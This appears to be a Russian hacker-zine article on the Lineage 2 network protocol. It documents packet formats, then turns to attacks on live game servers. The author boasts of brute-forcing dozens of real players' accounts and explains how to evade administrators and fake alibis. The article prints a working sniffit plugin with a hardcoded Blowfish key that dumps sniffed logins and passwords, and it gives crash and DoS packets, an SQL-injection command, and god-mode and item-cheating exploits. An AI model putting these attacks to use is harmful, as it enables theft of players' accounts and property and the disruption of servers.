+служит для идентификации того или иного объекта. Список этих идентификаторов и соответствующих им NPC/предметов
+храниться и на сервере и клиенте, и между собой они никак не синхронизируется. То есть, если сменить эту таблицу
+на сервере, то нужно патчить и клиент - это одна из причин, почему у каждого сервера свой патч.
+
+Помимо этого идентификатора есть ещё 32-ух битный Object ID. После захода в игровой мир, сервер присваивает
+каждому из предметов, которые есть у перса, свой уникальный OID. Причём OID каждого последующего предмета есть 
+OID текущего -1. То есть OID генерируется отнюдь не рандомно, а по порядку. После присвоения, OID
+резервируется, так чтобы никто больше не умудрился получить аналогичный. Эта информация, кстати, не
+подтверждена исходниками, то есть является моим собственным умозаключением. Если же это не так, то по
+прошествию полного круга (от 0xFFFFFFFF до 0x00000000) может получится так, что уже занятый OID будет присвоен
+новой шмотке, что приведят к неизвестным последствиям (возможности клонирования или простому падению сервера).
+Но проблема в том, что диапазон OID довольно таки велик :) А если быть более точным, нужно присвоить OID
+~4.3 млрду вещей, чтобы пройти полный круг, что даже на сервере с мега-онлайном займёт Н-ное число дней
+(а может и недель). Ещё раз повторюсь, это всего-лишь предположение. Но дело в том, что я, например, не
+видил ниодного la2 сервера (даже офф) с аптаймом более недели. Может проблема как раз в этом?
+А в целом, OID нужен для борьбы с клонированием. А точнее с выявлением оного.
+Что касается NPC, OID у них выдаётся по такому же закону, но при появлении NPC в мире. С OID персонажей то же самое.
+
+
+5. Примеры пакетов.
+
+a) покупка предметов
+Для того, чтобы поставить на скупку предмет, нам нужно воспользоваться 3-мя пакетами.
+Первый 0x94 (SetPrivateBuyMsg). Как видно из названия он устанавливает то сообщение, которое будет
+выводится над головой у перса в момент торговли (то, которое на жёлтом фоне). Вот пример:
+
+// SetPrivateStoreBuyMsg пакет
+XX XX   // Размер данных
+94      // тип пакета
+41 00 41 00 41 00 42 00 42 00 42 00 // текст. Символы должны быть разделены между собой null-байтом.
+00 00   // конец пакета
+
+Далее используем пакет типа 0x91 (SetPrivateBuyList). В нём как раз передаём количество предметов,Item ID
+и цену. Например:
+
+// SetPrivateStoreList пакет
+XX XX        // Размер данных
+91           // тип пакета
+01 00 00 00  // количество вещей
+// начало блока
+e1 02 00 00  // Item ID
+00 00
+01 00 00 00  // сколько предметов данного типа скупить
+e8 03 00 00  // цена
+// конец блока
+
+Немного поясню этот пакет. Им мы поставили на скупку 1 вещь с IID 0x2e1 (Scroll of Resurrection) за 1000 аден.
+И последний пакет типа 0x1d. Он непосредственно запускает торговлю:
+
+XX XX       // размер данных
+1d          // тип
+01 00 00 00 // кол-во 
+
+Что касается продажи, то там практически всё то же самое. Только вместо 'SetPrivateBuyMsg' юзаем
+'SetPrivateStoreMsg', а вместо 'SetPrivateBuyList' - 'SetPrivateStoreList' соответственно.
+А, чуть не забыл, вместо Item ID юзаем Object ID, потому что мы продаём какой-то конкретный предмет.
+
+
+b) приватные сообщения
+Тут всё очень просто.
+
+XX XX       // размер данных
+38          // тип пакета (Say2)
+42 00 42 00 42 00 42 // сообщение (BBBB)
+00 00 00 02 00 00 00 // пробел =)
+41 00 41 00 41 00 41 // ник (АААА)
+00 00 00    // конец
+
+
+c) пример пакета в котором сервер передаёт нам список всех предметов, которые есть на чаре. Причём, именно этот
+пакет закрепляет за каждым Item ID уникальный Object ID.
+
+XX XX // длина пакета
+
+1b // тип пакета (0x1b на antaras.ru)
+00 00 
+
+05 00 // количество предметов
+
+04 00       // тип шмотки
+1e 26 14 40 // Object ID
+d4 15 00 00 // Item ID (0x15d4 - Tutorial Guide)
+01 00 00 00 // Количество
+05 00 00 00 00 00 00 00 00 00 00 00 00 00 // Заточка, квестовый итем, дропается или нет и ещё что-то
+
+01 00       // тип шмотки
+1d 26 14 40 // Object ID
+7b 04 00 00 // Item ID (0x47b - Squire's pants)
+01 00 00 00 // Количество
+01 00 00 00 00 00 00 08 00 00 00 00 00 00 
+
+01 00       // тип шмотки
+1c 26 14 40 // Object ID
+7a 04 00 00 // Item ID (0x47a - Squire's Shirt)
+01 00 00 00 // Количество
+01 00 00 00 00 00 00 04 00 00 00 00 00 00 
+
+00 00       // тип шмотки
+1b 26 14 40 // Object ID
+0a 00 00 00 // Item ID (0x0a - dagger)
+01 00 00 00 // Количество
+00 00 00 00 00 00 80 00 00 00 00 00 00 00 
+
+00 00       // тип шмотки
+1a 26 14 40 // Object ID
+42 09 00 00 // Item ID (0x942 - Guild Member's Club)
+01 00 00 00 // Количество
+00 00 00 00 00 00 80 00 00 00 00 00 00 00 
+
+
+d) говорим с NPC на примере разучивания скиллов
+Для начала, нам нужно выделить NPC и завести с ним диалог:
+
+04 // тип пакета (Action)
+51 14 10 48 // OID NPC
+// далее идут координаты _нашего_ персонажа
+c6 51 01 00 // X
+52 45 02 00 // Y
+b8 f2 ff ff // Z
+00 // конец
+
+Причём однократная посылка этого пакета - выделение NPC. Чтобы завести с ним диалог, нужно послать этот пакет
+ещё раз.
+Далее, когда открывается окно с выбором диалогов и вы выбираете пункт "Learn skills", клиент серверу отсылает вот
+такой пакет:
+
+21 // тип пакета (RequestBypassToServer)
+6c 00 65 00 61 00 72 00 6e 00 5f 00 73 00 6b 00 69 00 6c 00 6c 00 00 // learn_skill
+00 // конец
+
+После вызова диалога со скиллами, вы можете либо посмотреть информацию о любом скилле с помощью:
+
+6b // тип пакета (RequestAcquireSkillInfo)
+10 00 00 00 // номер скилла
+09 00 00 00 // уровень
+
+Чтобы выучить этот скилл, посылается точно такой же пакет, но с типом 0x63 (RequestAcquireSkill)
+
+
+
+IV. Проблемы и как можно их использовать
+
+1. отсутствие лимита на кол-во попыток авторизации
+Это даёт возможность к бесконечному перебору паролей к тому или иному аккаунту. Я не буду
+описывать как и чего, брутфорсер он и в Африке брутфорсер. Расскажу лишь о своём личном опыте
+в этой области.
+Испытание проводилось на www.antaras.ru - старый, вымирающий отечественный lineage2 C1OFF сервер
+(с добавками из с3). Используя только ту информацию (ну и non-blocking sockets), что я
+предоставил выше, был написан брутфорсер (переборщик логинов и паролей) и программа, которая
+выдирает список ников, играющих в данный момент на сервере с 'http://antharas.ru/?id=2'.
+Составил от балды список паролей типа 123456789, 0987654321 (на antaras.ru минимальная длина
+пароля 8 символов - на всех серверах по-разному), список с никами,в данный момент играющих на
+сервере геймеров,составил ~1500 строк. Переборщик я запускал с постороннего сервера, дабы не
+палить свой ип. Итого, за ночь было вскрыто порядка 50 аккаунтов. Но, к сожалению, большая половина
+аккаунтов были либо пусты, либо с персонажами маленького уровня. Зато остальная малая часть...
+Скажу лишь, что суммарный урон, нанесённый геймерам, составил чуть больше 1ккк игровых денег (шмотом)
+или порядка 400$ ,если переводить в реальные - хотя как сторгуешься. Но, честно говоря, он не
+"составил", а "составил бы". Я, на самом деле, абсолютно ничего не взял с этих аккаунтов, а нашёл
+немного иное приминение всему этому ;) Об этом ниже.
+
+Есть 3 подводных камня во взломе аккаунтов этим методом.
+Во-первых, если мы логинимся на сервер под взломанным аккаунтом, а владелец его юзает в данный
+момент, то у него на экране появляется надпись, что кто-то ломится :/ Именно поэтому брутфорсер
+я зарядил на ночь, а вообще это лучше делать утром. Но, по моему небольшому опыту, могу сказать,
+что, то ли юзеры не обращают внимание на эту надпись, то ли не знают английского, то ли вообще
+не умеют менять пароль, но у меня проблем с такими аккаунтами (на которых кто-то играл) не возникло.
+Имею в виду, никто не сменил пароль из тех, кто меня пропалил.
+Во-вторых, ник != логин. Моя программа брала ники игроков, которые играли на сервере, но отнюдь
+не их логины. Но это тоже не особо серьёзная проблема в случае такого "массового" взлома, так как
+даже если у человека с ником NICKNAME логин LOGINNAME, то обязательно найдётся кто-то с логином
+NICKNAME и перебор паролей к нику NICKNAME не пройдёт напрасно, хоть мы взломаем и не этого
+конкретного персонажа.
+В-третьих, если вы раздели того или иного персонажа, он может обратиться к администрации и есть
+вероятность, что ему всё вернут. Как это предотвратить? Я с этим не сталкивался, но, помыслив
+логически, могу предположить, что:
+Они всё вернут, если чел докажет, что его раздели. Вы же можете сказать в своё оправдание,
+что купили у него всё за реал - это же нигде не фиксируется - а чел захотел вас кинуть. Для большей
+убедительности, в момент "раздевания" переведите со своего кошелька на любой другой кругленькую
+сумму и сделайте скриншот.
+Но админы, в свою очередь ,могут посмотреть в логах и увидеть там тысячи попыток залогиниться, соответственно
+дайте аккаунту недельки две отстоятся после взлома, пусть логи об атаке канут в лету. Также админы
+могут обратить внимание на ип, с которого обычно заходит жертва и его несоответствие с тем, с которого
+он был раздет. Тут уж.. Можете найти того, кто юзает этого же провайдера, либо воспользоваться его
+услугами самостоятельно, либо сломать один из его боксов, либо пытаться обьяснить админам,
+что он просто так ловко вас подставил.
+Программ, которые реализуют описанный способ взлома Lineage2 аккаунтов, в интернете я не видел...
+Именно поэтому решил написать и продавать свою - la2brute.5bb.ru.
+Нужно признать, что с началом повального её использования, аккаунты ломать стало всё сложнее и сложнее.
+Если я, после того как её написал (где-то в феврале 2006-го), на Российских популярных серверах мог
+сломать по 30-50 аккаунтов за ночь, то сейчас эта цифра в 4-5 раз меньше.
+И последнее, хочется отметить, что единственный сервер, который сделал-таки защиту от перебора, был la2.abyss.ru.
+Хотя на самом деле, ещё на antaras.ru ввели защиту - блокирование аккаунта на 5 минут после 40-ка
+ошибочных попыток залогиниться. Но при том массовом переборе, о котором я писал выше, эта защита
+практически бесполезна.
+
+
+
+2. Шифрование пакетов
+Как я уже говорил выше, ключ, который используется для генерации подключей в логин сервере, постоянный.
+Оно и понятно, ведь для вычисления всех значений P и S алгоритм шифрования Blowfish необходимо выполнить
+521 раз. Если выполнять генерацию новых значений при каждом клиенте, это будет сжирать крайне много
+системных ресурсов. Но дело в том, что l2j так и делает! Хоть ключ и постоянный, l2j генерирует подключи
+для каждого соединения! Я не знаю, как офф версия (у меня её нет и её очень трудно достать), но l2j
+доказывает, что нынешним компьютерам это вполне под силу.
+А проблема заключается в том, что мы можем снифать чужие сеансы и с лёгкостью их расшифровывать,
+вытаскивая логин и пароль. Так в чём же тогда смысл шифрования пакетов blowfish'ем?
+
+Я написал плагин для sniffit версии 0.3.7.beta, который ловит и расшифровывает все пакеты, проходящие
+через ваш компьютер и содержащие логин/пароль к lineage2 аккаунтам. 
+
+====> la2_plugin.plug <====
+/*
+
+ Sniffit 0.3.7.beta LineAge2 c3 plugin
+ Allows to catch and decode la2 RequestAuthLogin packets *on the fly*
+ and dump login/passwords.
+ 
+ by darkgrey / m00.blackhat.ru
+
+ ~broken
+*/
+
+#include "/usr/local/include/blowfish.h"
+#define KEY_LEN 20
+
+BF_KEY bfkey;
+
+char key[] = "[;'.]94-31==-&%@!^+]";
+
+void init_la2_plugin() {
+	
+	printf("LineAge2 C3 plugin enabled\n\n");
+	BF_set_key(&bfkey, KEY_LEN, key);
+	
+}
+
+void PL_la2_plugin (struct Plugin_data *PLD) {
+	int i = 0;
+	int count = (PLD->PL_info.DATA_len - 2) / 8;
+	char *ptr = PLD->PL_data;
+	unsigned char *ls_ip;
+	
+	if(PLD->PL_info.DATA_len == 0x32 && PLD->PL_info.UDP_len == 0) {
+		ls_ip=(unsigned char *)&(PLD->PL_iphead.destination);
+		printf("Login Server ip: %u.%u.%u.%u\n",ls_ip[0],ls_ip[1],ls_ip[2],ls_ip[3]);
+		
+		for(i = 0; i < count; i++)
+			BF_encrypt((BF_LONG *)((short*)ptr+1+i*4), &bfkey, BF_DECRYPT);
+			
+		i = 2; printf("Login: ");
+		while(PLD->PL_data[i++] != '\x00' || i != 16)
+			printf("%c",PLD->PL_data[i]);
+		
+		printf("\nPassword: ");
+		while(PLD->PL_data[i++] != '\x00' || PLD->PL_data[i] != '\x08')
+			printf("%c",PLD->PL_data[i]);
+
+		printf("\n");
+	}
+}
+/* eof */
+
+====> sn_plugins.h <====
+#define PLUGIN2_NAME 	"LineAge2 c3 Plugin"
+#define PLUGIN2(x)	PL_la2_plugin(x)
+#define PLUGIN2_INIT() init_la2_plugin()
+#include "la2_plugin.plug"
+/* eof */
+
+Для того, чтобы его использовать, вам нужно скопировать оба файла в каталог со sniffit. Ну и для
+компиляции вам понадобится всё та же библиотека blowfish и соответствующая запись в make-файле.
+m00.blackhat.ru/m00-la2sniff.jpg - демонстрирует работу переборщика паролей к lineage2 серверам
+и параллельно запущенный sniffit с установленным плагином на примере www.antaras.ru (217.107.212.212 -
+ип логин-сервера).
+
+
+3. Удалённое определение версии lineage2 сервера
+Помните я говорил, что последние 8 байт в пакетах логин-сервера отводятся под чексумму? Точнее, из них
+предпоследние 4 :> А если вдруг оставить пакет без чексуммы, офф версия lineage сервера нас просто-
+напросто дисконнектит. В l2j функция, которая проверяет чексумму возвращает true или false,
+но почему-то возвращаемое значение не проверяется. То есть, фактически l2j не проверяет чексумму.
+Соответственно, если дисконнект, то офф, если нет, то l2j.
+
+
+4. Удалённое "подвешивание" login-сервера
+Было замечено, что некоторые серверы на пакеты, не содержащие логина/пароля отвечают пакетом типа 0x03
+(который означает, что вы успешно авторизованы). После чего начинают вести себя крайне нестабильно.
+Я проверил это на 10-ти крупных С3 серверах, половина никак не отвечала на такой пакет, другая
+отвечала пакетом 0x01 (авторизация не прошла), но только www.la2.ru посылал 0x03 и на время прекращал
+принимать входящие соединения (видимо, у них установлена система "авто-подъёма").
+Для реализации программы, которая бы подвешивала la2.ru, вам нужно всего-лишь смешать выше-предоставленный
+генератор пакетов с простым tcp-клиентом.
+Бесконечный цикл посыла подобных пакетов приведёт к невозможности зайти на игровой сервер.
+
+
+5. Клонирование
+Уязвимость о которой сейчас пойдёт речь имела место быть в С1 версии ЛА2, поэтому особо заострять внимание
+на ней не буду.
+Суть заключалась в том, что мы, авторизовавшись на login-сервере 1 раз под одним аккаунтом, могли заходить
+на game-сервер под этим же аккаунтом параллельно неограниченное число раз. Соответственно, можно было входить
+в игру под одним и тем же персонажем сколько угодно.
+Вторая возможность клонирования была описана в параграфе про IID и OID.
+Клонирование предметов через WH, питомцев и тд рассматривать не буду, мне не кажется эта тема интересной, т.к.
+на нормальных серверах это уже давно не работает.
+
+
+6. Создание "мутантов" и смешение скиллов
+Очень интересная тема. Первым кто реализовал программно эти идеи (в рунете) был hint.
+Для начала, на сколько вам известно, в lineage существует несколько расс. За каждой из них закреплены свои
+классы (маг и войн). Но класс одной рассы естесственно отличается от аналогичного класса другой рассы (скиллами).
+А у рассы гномов нет класса магов вообще. Это было необходимое предисловие, чтобы понять смысл всего нижеописанного.
+А теперь рассмотрим запрос на создание персонажа:
+0B // тип пакета
+45 00 6D 00 30 00 30 00 00 00 // ник перса
+04 00 00 00 // расса
+00 00 00 00 // пол
+35 00 00 00 // начальная профессия (класс)
+14 00 00 00 // 6 постоянных значений, я затрудняюсь сказать, что они значат
+27 00 00 00 //
+2D 00 00 00 //
+1B 00 00 00 //
+1D 00 00 00 //
+0A 00 00 00 //
+00 00 00 00 // тип волос
+00 00 00 00 // цвет волос
+00 00 00 00 // тип лица
+Этот пакет создаст Гнома война с ником "m00" мужского пола. 
+Оказалось, что сервер (даже оффициальный) не проверяет соответствие рассы с выбраным классом. Это позволяет нам
+создавать чаров одной рассы с классом совершенно другой (я их называю мутантами =)). Звучит, конечно, интересно, но
+на самом деле мы имеем обычного чара со своими статами и скиллами, но с несвойственными ему текстурами. По идее
+баг кроме фана нам ничего дать не может (фана ввиде светлого эльфа спойлящего мобов :)), но оказалось, что из этого,
+на первый взгляд, неинтересного бага проистекают ещё два.
+Насколько вы знаете, у каждой рассы есть свои NPC у которых берутся квесты на профессию и учатся скиллы. Так
+вот, мутанты учат скиллы класса одной рассы у NPC другой рассы. К примеру, я, играя светлым эльфом, учил скилл
+гномов "Spoil" у NPC эльфов. И тут встал вопрос, а кто мне тогда будет давать профессию и какую?
+Дело в том, что скиллы даются в зависимости от профессии (в даном контексте "класса"), а вот квесты в
+зависимости от рассы. То есть, может получится такое, что по достижению 20-го уровня и будучи гномом-спойлером,
+вы сможете получить профессию "Elven Knight" (первая профессия светлых эльфов).
+Но эта информация не подтверждена на практике.
+Кстати говоря, считанное количество мутантов могут вообще учить скиллы.
+А вообще, если говорить о скиллах, то в ла2 есть ещё один баг. LA2 офф клиент не проверяет соответствие уровня чара и
+уровня доступного для изучения скилла. То есть, к примеру, будучи на 5-ом лвле human fighter'ом вы можете учить
+mortal blow максимального уровня (при условии, что хватит SP). Это легко реализуется на пакетном уровне.
+Ещё хочется добавить, что на l2j сервере какие-либо проверки вообще отсутствуют. То есть вы можете учить даже те
+скиллы, которые доступны только GM-ам.
+
+
+7. Бессмертие.
+Вот мы и дошли до самой интересной темы, именуемой в простонародье - god mode.
+Согласитесь, на сервере, где онлайн больше 1000 человек, быть бессмертным - одно удовольствие =)
+Для начала, когда наступает бессмертие? На этот вопрос был дан банальный, но как оказалось точный ответ:
+когда чар уже мёртв.
+Казалось бы бред, но когда у персонажа 0 HP и он жив, его действительно невозможно убить (ну не савсем невозможно :) -
+об этом ниже). Но как сделать, чтобы у чара был абсолютный 0 HP, он был жив и при этом ещё HP не восстанавливались?
+Для начала рассмотрим вопрос с 0 HP. В la2 есть такой баг: если после смерти нажать на "return to the nearest village"
+и сразу же завершить процесс l2.exe, чар появится в городе с абсолютным 0 HP и даже с баффами (если они до этого были).
+Это свезано с тем, что после RequestRestartPoint-пакета клиент должен посылать пакет Apearing, после которого
+собственно сервер и восстанавливает чару HP и убирает баффы. А так как клиент мы закрываем, он этот пакет
+послать не успевает.
+Кстати, почему я всё время говорю "абсолютный" 0? Дело в том, что на сервере HP хранятся в переменной типа float
+(что самое интересное, клиенту пересылается оно в виде целого числа). То есть, если вы будете постепенно снижать
+HP до 0 с помощью bleed или poison, то вы не получите абсолютный 0, а если HP не ноль, значит вы живы.
+Поэтому единственный способ получить абсолютный 0 - это умереть.
+Вот, делать 0 HP мы научились, теперь поговорим о том, как заморозить их на нуле. 
+1) Первым шагом в этом направлении было создание гнома-мага (как было описано в предыдущем параграфе). Скорее всего,
+в следствие того, что у гномов нет такого класса как маг вообще, у него не регенерируются HP/MP. Соответственно,
+проделав с таким гномом выше-упомянутые действия, получим бессмертного персонажа. Этот баг пофиксили практически везде.
+2) Второй способ был открыт несколько позднее гномов-магов. Оказалось, что при выборе несуществующей рассы, создаются
+бессмертные human'ы с любым классом. И самое интересное, что если таким способом создавать класс human mage, всё равно
+получится human fighter, но с магическими скиллами.
+У этих двух способов есть два очень весомых недостатка:
+	a) созданные персонажи не могут учить скиллы и получать профессию.
+	b) как вы понимаете, реген HP не работает вообще, соответственно вам придётся бегать бессмертным всё время.
+3) А теперь, внимание, баг - который мне помог найти всё тот же hint.
+Насколько вы знаете, в линейке есть такая штука как перевес. Когда вы загружены на 65%+, у вас падает скорость
+бега, атаки и регенерации. Но мало кто знает, что если у вас 90%+, то помимо того, что вы не можете двигаться, у вас
+не регенерируется HP! Но что толку от того, что, появившись после смерти в городе, вы будете стоять на месте бессмертным?
+А тут нам поможет страйдер! Сев на него, вы сможете бегать с его скоростью при том, что HP всё равно не
+регенерируется! Но тут есть тоже маленький подводный камень - на некоторых серверах (reborn.ru - C4) нельзя атаковать
+будучи на страйдере. Тут уж ничего не поделаешь, могу посоветовать только пользоваться баффом blazing skin/freazing skin.
+4) ну и последний баг с бессмертием - это demon's set. Это пожалуй самый старый баг на бессмертие и о нём в принципе все
+знают. Завязан он на том, что у вас получается отрицательные хп и вас соответственно опять же нельзя убить.
+
+Все вышеописанные типы бессмертия объединяет один серьёзный недостаток. Персонаж перестаёт быть бессмертным как только
+у него каким-либо образом прибавится HP - в следствие lvlup'а или банального heal'а. Также он умирает от bleed, poison,
+некоторых вампиризмов.
+
+Ещё тут вспомнился баг с "fake death". На некоторых кривых явах после FD чары как бы так и остаются мёртвыми и их нельзя
+атаковать пока они не сделают рестарт. Ну это так, к слову.
+
+
+8. 'remote DoS' и что это даёт
+Обычно уязвимости подобного рода особо не ценятся, так как более чем просто "поприкалываться" из них ничего
+получить нельзя. LA2 же постоянно сохраняет состояние мира (через каждые Н-секунд - этот вопрос ещё точно не
+изучен, да он и не так важен), чтобы после внезапного падения сделать откат. То есть, умея прогнозировать
+(или провоцировать) падение game-сервера, мы получаем "власть над откатами". Что это значит? А то, что,
+вас убили? Откат! Вас раздели? Откат!! У вас не получилось заточить шмотку? Откат!!!
+Кроме того, есть очень ценные монстры, которые имеют очень большое resp time (fairy queen timinel - респ
+5 часов, например) и присутствуют в единичном экземпляре. Убили, повалили сервер, сервер поднялся, моб снова
+появился. В итоге время респа сокращается с 5 часов до 3-ёх минут.
+Как же перегружать сервер?
+Для l2j 100% рабочий способ - это кристализация.
+72 // RequestCrystallizeItem
+00 00 00 00 // OID предмета
+FF FF FF FF // количество
+Подставляем в этот пакет реальный OID предмета и отсылаем. На что сервер моментально падает.
+Для проджектов тут всё сложнее. При шифровании пакетов неправильным ключём, сервер иногда падает. ПОчему? Если
+ключи не совпадают, значит сервер при расшифровке получает совершенно рандомные значения (то есть ни то, что мы
+зашифровывали). И выследить как раз ту последовательность значений, при которой сервер падает, у меня пока что
+не получилось.
+
+
+9. integer overflow в сетевом движке l2j
+Ну и так, чтобы окончательно опровергнуть мнение о том, что в lineage2 нет серьёзных багов,
+продемонстрирую вам целочисленное переполнение в сервере l2j в процедуре обработки клиентских
+пакетов:
+public void run()
+{
+    _log.fine("loginserver thread[C] started");
+    int lengthHi = 0;
+    int lengthLo = 0;
+    int length = 0;
+    boolean checksumOk = false;
+    int sessionKey = -1;
+    String account = null;
+    String gameServerIp = null;
+    try
+    {
+        InetAddress adr = InetAddress.getByName(_gameServerHost);
+        gameServerIp = adr.getHostAddress();
+        Init startPacket = new Init();
+        _out.write(startPacket.getLength() & 0xff);
+        _out.write(startPacket.getLength() >> 8 & 0xff);
+        _out.write(startPacket.getContent());
+        _out.flush();
+        do
+        {
+            lengthLo = _in.read();
+            lengthHi = _in.read();
+            length = lengthHi * 256 + lengthLo;
+            if(lengthHi < 0)
+            {
+                _log.warning("Client terminated the connection.");
+                break;
+            }
+            byte incoming[] = new byte[length];
+            incoming[0] = (byte)lengthLo;
+            incoming[1] = (byte)lengthHi;
+.................
+Это конечно не савсем 'integer overflow' в классическом понимании этого словосочетания,
+но приводит оно сначала к двух-байтному переполнению (off-by-two overflow), а затем к ...
+Похожая уязвимость имеется в ла2 клиенте и l2walker'е. Они виснут, сжирая 100% процессорного времени.
+Но их исходников у меня нет, но есть основание полагать, что там код несколько иной.
+Кстати говоря, сервер L2J просто от и до заполнен подобными багами. Многие из них описаны на читерских форумах.
+
+
+10. SQL-injection
+Да, через этот баг в форумах было взломано, наверное, ещё больше серверов чем когда-то с помощью unicode-бага в
+iis. Каково было моё удивление, когда я узнал, что он есть и в lineage. А оно в принципе и понятно,
+многое из того, что мы передаём la2-серверу (тайтлы для членов клана, ник для игнора, список друзей и тд) сразу же
+добавляется в серверную sql-базу. Соответственно, простой командой: /block 'SHUTDOWN-- мы можем выключить sql-сервер.
+Больше всего поражает то, что админы, бравшиеся фиксить этот баг, в первую очередь фильтровали данные на слово
+"SHUTDOWN--" и только потом догадались, что рестарт сервера - это самое минимальное из того, что можно сделать
+используя этот баг.
+Более подробно на этом баге я останавливаться не буду, так как он, пожалуй, самый серьёзный из того, что вообще
+есть в линейке. Скажу лишь, что фиксят его крайне криво :)
+
+
+11. Заточка
+Мне кажется, баг с заточкой стоит на втором месте по востребованности после "дюпа".
+Что такое заточка вообще? Это такой свиток, который позволяет улучшить характеристики той или иной шмотки, после
+чего удаляется. Но улучшать можно отнюдь не до бесконечности. После +3 появляется вероятность того, что шмотка сломается.
+Причём, чем выше степень "заточенности" вещи, тем больше вероятность её поломки (кстати, не факт, об этом ниже).
+Как раз наличие вот этой переменной "вероятности" привело к появлению бесчисленного множества способов заточки.
+К примеру, у кого-то вдруг каким-то чудом получилось заточить на +6, когда он ... бежал! И теперь этот человек пишет
+на форумах, что это новый 100% способ точки. Также некоторые пишут, что лучше точить 1 раз на 1-ом уровне, лучше
+точить гномом, также что вероятность зависит от "рекомендаций", от интеллекта (кстати, про INT мне сказал достаточно
+просвещённый человек), лучше точить ночью, использовать soulshots, бить в этот момент моба, замерять время между
+точками и так далее и тому подобное. Я, конечно, не могу спорить с этими высказываниями, так как я сам не опробовал
+всё, что пишут на форумах, но знаю точно - за 100% способ заточки многие люди готовы выплатить неплохие деньги.
+Следовательно, такого способа на публике к сожалению нет. А есть ли он вообще? Попробуем вместе в этом разобраться.
+Для начала, давайте разберём то, как на пакетном уровне точится шмотка:
+1-ый пакет - это когда в игре мы нажимаем правой кнопкой на заточке, то есть активируем её.
+
+14 // тип пакета (UseItem)
+86 a4 13 40 // OID заточки
+00 00 00 00
+
+После активации заточки мы выбираем тот предмет, который хотим точить:
+
+58 // тип пакета (RequestEnchantItem)
+74 a4 13 40 // OID предмета
+
+Всё предельно просто.
+Кстати говоря, наряду с многочисленными способами заточки, существовала такая теория, что вероятность точки
+просчитывается на клиенте и как бы мы говорим серверу, сломался предмет или нет. И будто бы простым artmoney
+можно 100% точить. Это не правда, вы только что в этом убедились.
+Действительно, на пакетном уровне точка выглядить предельно просто. Как можно обмануть эту систему?
+Я могу предложить вам вот такие варианты:
+1. активировать одну и ту же заточку несколько раз
+2. послать RequestEnchantItem-пакет несколько раз
+3. drop'нуть заточку после активации (позволит точить одной заточкой сколько угодно), либо позволит делать ложную (fake)
+Заточку.
+4. дропнуть шмотку сразу же после RequestEnchantItem-пакета. Если успеете, шмотка может не сломаться. Но заточется ли?
+Все эти способы я опробовал на antaras.ru, к сожалению на нём они не сработали, но, уверяю, один из них 100%
+работает на некоторых крупнейших Российских серверах. По просьбе того человека, кто мне с этим помогал, я не могу
+назвать эти серверы и описать способ подробнее.
+
+Помимо выше-описанных способов точки, есть ещё метод fake-заточки. Он как раз основан на том, что после активации
+заточки, мы куда-нибудь её прячем. Сервер просчитывает заточился предмет или нет и выводит результат, который из-за
+спрятанной заточки не вводится в силу. То есть предмет и не ломается и не точится, но мы видим результат.
+На основе этого метода, народ пытался искать какие-то закономерности в точке и просчитывать её вероятность.
+Что касается закономерностей, как это не удивительно, они их находили. Но наличие закономерности ставит под
+вопрос само существование рандома в точке. По крайней мере степень его "рандомности".
+Вот наработки взятые с форума cheaters.net.ua, а точнее из поста F4llen'a (прямую ссылку ищите в конце):
++1 100% 
++2 100% 
++3 100%
++4 -+-+-+ (+-+-+-) или же (----++++----+++) 
++5 ++---++-++----+++--- 
++6 +++++----+--++-- 
++7 +++++++++------ 
++8 +++-+-+++----+++ 
++9 ++-++--++---++-- 
++10 ++--+--++--+ 
+"+" означает успешную заточку, "-" соответственно кристаллы.
+Исходя из этой "таблицы" он выдвинул теорию, что на каждом этапе заточки есть свой "тип рандомайзера":
+а) много плюсов подряд в начале +++++--+----+ 
+б) 2 плюса и минусы ++--++-----++-++--- 
+в) плюс-минус +-+-+-+ 4 ложные заточки должны дать ответ. 
+Соответственно, определив какой вы имеете тип на данном этапе, можно было предсказывать успех/неудачу точки.
+С одной стороны, мне кажется бредом разделение рандомайза на типы, с другой же я знаю людей, которые смогли заточить
+таким способом аж до +15-ти.
+Давайте попробуем с точки зрения тер/вера рассмотреть эту статистику:
+Заточка  Всего/Успех  Вер. успеха
+ +4         15/7         0.466
+ +5         20/9         0.45
+ +6         16/8         0.50
+ +7         15/9         0.60
+ +8         16/10        0.625
+ +9         16/8         0.50 
+ +10        12/6         0.50
+Получившиеся данные верны ровно на столько, на сколько верна таблица F4llen'а. Посчитав среднее значение вероятностей
+успешной заточки, получим число 0.52, что означает, что успешная и ложная заточка в целом равновероятны. Для каждого
+же конкретного этапа заточки, можно сказать то же самое и сейчас объясню почему.
+Напишем маленькую программу, которая будет генерировать равновероятно цифру 1 или 0. Делать она это будет 240 раз,
+для каждых 60-ти чисел (можно считать их этапами заточки) будет счетать вероятность выпадения единицы (в дальнейшем
+ "успех") и в итоге счетать общую вероятность успеха для всех 240 чисел (за вероятность успеха принимаем процентное
+соотношение единиц и нулей к 240):
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+
+int main () {
+  int O = 0, I = 0, Ot = 0, It = 0, total = 241, r = 0;
+  srand(time(0));
+  for(int i = 0;i < total;i++) {
+	r = rand()%2;
+	printf("%i ",r);
+	if(r) I++; else O++;
+	if(!(i%60)) {
+		printf("\n%i/%i\nВероятность успеха: %.2f\n",I,O,I/0.60);
+		Ot+=O; It+=I;
+		I = 0; O = 0;
+	}
+    
+  }
+  printf("Вероятность успеха в целом: %.2f\n",It/2.40);
+  return 0;
+}
+
+Вот, что программа вывела на экран:
+-----------------------
+0 1 1 0 1 1 0 1 1 0 0 0 0 0 0 1 0 1 0 1 1 0 0 1 1 1 0 1 1 1 0 0 0 1 0 0 0 1 0 1
+1 0 0 0 0 0 0 1 1 1 1 1 0 1 1 0 1 0 0 1
+29/31
+Вероятность успеха: 48.33
+0 0 0 1 1 0 0 0 0 1 0 1 1 1 0 0 0 1 1 0 1 0 1 0 1 0 0 1 1 1 1 0 1 1 0 1 0 0 0 1
+0 1 0 0 1 1 0 1 1 0 1 0 1 1 0 1 1 1 1 1
+32/28
+Вероятность успеха: 53.33
+1 0 1 1 0 1 0 1 1 1 0 1 1 1 0 1 1 0 0 1 1 0 1 1 1 1 0 1 1 1 0 0 0 1 0 0 1 1 0 0
+0 1 0 1 1 0 0 1 0 1 0 0 1 0 0 0 0 1 0 0
+31/29
+Вероятность успеха: 51.67
+1 0 0 1 1 1 1 0 0 0 0 0 0 0 1 1 0 0 1 1 1 0 1 0 0 1 0 0 0 1 0 0 0 1 0 1 0 1 1 0
+1 0 1 0 0 0 1 0 1 1 0 0 1 0 0 1 0 1 1 1
+27/33
+Вероятность успеха: 45.00
+Вероятность успеха в целом: 50.00
+-----------------------
